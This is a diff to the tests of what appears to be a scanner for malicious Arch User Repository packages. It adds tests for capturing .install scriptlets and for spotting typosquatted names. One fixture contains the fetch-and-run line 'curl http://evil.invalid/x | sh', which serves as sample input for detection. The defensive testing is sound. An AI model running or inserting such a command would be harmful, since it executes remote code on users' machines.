@@ -86,7 +86,7 @@ def test_fetch_pkgbuild_with_tree_extracts_manifest():
         "icon.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 8,
     })
     with patch.object(F, "_http_get", return_value=body):
-        text, manifest, trailer_finding, refused = F.fetch_pkgbuild_with_tree("demo")
+        text, manifest, trailer_finding, refused, install_text = F.fetch_pkgbuild_with_tree("demo")
 
     assert text == "pkgname=demo\npkgver=1.0\n"
     assert manifest is not None
@@ -103,7 +103,7 @@ def test_fetch_pkgbuild_with_tree_falls_back_to_cgit():
     from trustsight.full_aur import fetch as F
 
     with patch.object(F, "_http_get", side_effect=[None, b"pkgname=demo\n"]):
-        text, manifest, trailer_finding, refused = F.fetch_pkgbuild_with_tree("demo")
+        text, manifest, trailer_finding, refused, install_text = F.fetch_pkgbuild_with_tree("demo")
 
     assert text == "pkgname=demo\n"
     assert manifest is None
@@ -117,7 +117,7 @@ def test_fetch_pkgbuild_with_tree_flags_trailing_archive_bytes():
 
     body = _snapshot_tarball("demo", "pkgname=demo\npkgver=1.0\n") + b"JUNK"
     with patch.object(F, "_http_get", return_value=body):
-        text, manifest, trailer_finding, refused = F.fetch_pkgbuild_with_tree("demo")
+        text, manifest, trailer_finding, refused, install_text = F.fetch_pkgbuild_with_tree("demo")
 
     assert text == "pkgname=demo\npkgver=1.0\n"
     assert manifest is not None
@@ -152,14 +152,14 @@ def test_iter_prefetched_yields_none_for_a_failing_fetch():
     def fetch(name):
         if name == "boom":
             raise RuntimeError("network")
-        return (f"ok-{name}", None, None, False)
+        return (f"ok-{name}", None, None, False, None)
 
     out = dict(_iter_prefetched(["a", "boom", "b"], fetch, workers=4))
     # The placeholder must match the 4-tuple shape ``_store`` unpacks; a
     # 3-tuple here raised ValueError out of the analysis loop and aborted
     # the whole cycle.
-    assert out["boom"] == (None, None, None, False)
-    assert out["a"] == ("ok-a", None, None, False)
+    assert out["boom"] == (None, None, None, False, None)
+    assert out["a"] == ("ok-a", None, None, False, None)
 
 
 # --- polite fetching: rate cap + backoff on 429/5xx/reset ---
@@ -311,7 +311,7 @@ def test_a_not_vetted_package_survives_the_cycle_and_is_retried(monkeypatch):
                         lambda old, new: {"demo": "modified"})
     monkeypatch.setattr(pipeline, "load_resume_state", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "fetch_pkgbuild_with_tree",
-                        lambda *a, **k: ("pkgver=1\n", None, None, False))
+                        lambda *a, **k: ("pkgver=1\n", None, None, False, None))
     monkeypatch.setattr(pipeline, "get_pkgbuild_snapshot", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "is_reserved_name", lambda _n: False)
     monkeypatch.setattr(pipeline, "_pkg_or_base", lambda _m: "demo")
@@ -419,7 +419,7 @@ def _stub_cycle(monkeypatch, pipeline, scores_by_name, order=None):
                         lambda old, new: {name: "modified" for name in meta})
     monkeypatch.setattr(pipeline, "load_resume_state", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "fetch_pkgbuild_with_tree",
-                        lambda *a, **k: ("pkgbuild", None, None, False))
+                        lambda *a, **k: ("pkgbuild", None, None, False, None))
     monkeypatch.setattr(pipeline, "is_reserved_name", lambda _n: False)
     monkeypatch.setattr(pipeline, "_pkg_or_base", lambda _m: "demo")
     monkeypatch.setattr(pipeline, "save_resume_state", lambda state: None)
@@ -515,7 +515,7 @@ def _stub_since_cycle(monkeypatch, pipeline, packages):
     monkeypatch.setattr(pipeline, "diff_metadata", lambda old, new: {})
     monkeypatch.setattr(pipeline, "load_resume_state", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "fetch_pkgbuild_with_tree",
-                        lambda *a, **k: ("pkgbuild", None, None, False))
+                        lambda *a, **k: ("pkgbuild", None, None, False, None))
     monkeypatch.setattr(pipeline, "is_reserved_name", lambda _n: False)
     monkeypatch.setattr(pipeline, "_pkg_or_base", lambda _m: "demo")
     monkeypatch.setattr(pipeline, "save_resume_state", lambda state: None)
@@ -803,3 +803,44 @@ def test_g8_source_divergence_is_directional():
     info = [e for e in fact.score_breakdown
             if e.rule_id == "H103" and e.severity == "INFO"]
     assert info and "gone.tar.gz" in info[0].evidence.get("sources", "")
+
+
+def test_fetch_extracts_the_install_scriptlet():
+    """The snapshot's ``.install`` scriptlet is captured beside the PKGBUILD."""
+    from trustsight.full_aur import fetch as F
+
+    body = _snapshot_tarball(
+        "demo", "pkgname=demo\ninstall=demo.install\n",
+        {"demo.install": b"post_install() {\n  true\n}\n"},
+    )
+    with patch.object(F, "_http_get", return_value=body):
+        text, manifest, trailer, refused, install = F.fetch_pkgbuild_with_tree("demo")
+
+    assert install == "post_install() {\n  true\n}\n"
+
+
+def test_install_scriptlet_becomes_an_added_file_in_the_corpus_diff():
+    """The install rules only see the scriptlet once it is in the diff."""
+    from trustsight.full_aur.analyze import _install_diff_text
+
+    diff = _install_diff_text("curl http://evil.invalid/x | sh\n", "yyay")
+    assert "+++ b/yyay.install" in diff
+    assert "+curl http://evil.invalid/x | sh" in diff
+    assert _install_diff_text("", "yyay") == ""
+
+
+def test_popular_candidates_drive_the_corpus_typosquat_check():
+    """The AUR vote list is built once and drives H029/G005 in the corpus."""
+    from trustsight.full_aur.pipeline import _impersonates, _popular_candidates
+
+    meta = {
+        "yay": {"NumVotes": 2649, "Maintainer": "jguer"},
+        "paru": {"NumVotes": 1260, "Maintainer": "Morganamilo"},
+        "tiny": {"NumVotes": 3, "Maintainer": "x"},
+        "yyay": {"NumVotes": 0, "Maintainer": "marchos1as"},
+    }
+    candidates = _popular_candidates(meta)
+    assert ("yay", 2649) in candidates
+    assert ("tiny", 3) not in candidates  # below the popularity floor
+    assert _impersonates("yyay", meta["yyay"], candidates) == "yay"
+    assert _impersonates("tiny", meta["tiny"], candidates) == ""
